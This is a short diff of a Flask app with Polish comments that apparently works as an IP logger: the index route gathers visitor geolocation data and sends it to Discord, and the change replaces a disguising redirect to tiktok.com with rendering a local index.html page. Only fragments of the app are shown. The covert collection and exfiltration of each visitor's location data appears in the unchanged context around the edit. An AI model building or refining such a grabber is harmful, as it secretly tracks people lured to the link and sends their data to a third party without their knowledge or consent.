@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect
+from flask import Flask, request, redirect, render_template
 from datetime import datetime
 import requests
 
@@ -72,7 +72,8 @@ def index():
     # POPRAWKA 5: Zmiana send_ip(ip, date) na prawidłowe wywołanie funkcji z odpowiednimi danymi
     send_to_discord(geo_data, date_str)
 
-    return redirect("https://tiktok.com")
+    # Serwer renderuje plik index.html z folderu templates
+    return render_template("index.html")
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
